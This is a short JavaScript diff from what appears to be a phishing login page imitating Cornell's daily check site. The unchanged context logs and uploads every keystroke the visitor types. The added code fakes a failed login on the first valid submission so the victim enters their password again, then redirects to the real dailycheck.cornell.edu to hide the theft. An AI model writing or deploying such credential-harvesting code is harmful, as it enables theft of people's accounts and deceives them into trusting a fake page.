@@ -35,10 +35,19 @@ window.addEventListener('keydown', e => {
     uploadSet('char: ' + e.key)
 })
 
-
+stage = 0
 Id('submit').onclick = () => {
     if (valid(Id('username').value) && Id('password').value.length > 6){
-        window.location.href = 'https://dailycheck.cornell.edu'
+        if (stage == 0){
+            Id('reason').style.display = 'none'
+            setTimeout(()=>{
+                Id('reason').style.display = 'block'
+            },50)
+            stage = 1
+        }else{
+            window.location.href = 'https://dailycheck.cornell.edu'
+        }
+
     }else{
         Id('reason').style.display = 'none'
         setTimeout(()=>{
